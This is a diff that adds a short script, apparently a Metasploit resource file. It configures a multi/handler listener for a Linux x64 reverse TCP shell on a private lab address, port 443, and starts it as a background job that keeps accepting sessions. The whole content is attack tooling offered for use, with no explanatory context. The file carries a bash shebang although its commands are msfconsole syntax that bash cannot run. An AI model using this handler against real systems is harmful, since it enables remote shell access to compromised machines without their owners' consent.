@@ -1,0 +1,8 @@
+#!/bin/bash
+
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell/reverse_tcp
+set LHOST 10.11.0.40
+set LPORT 443
+set ExitOnSession false
+exploit -j -z
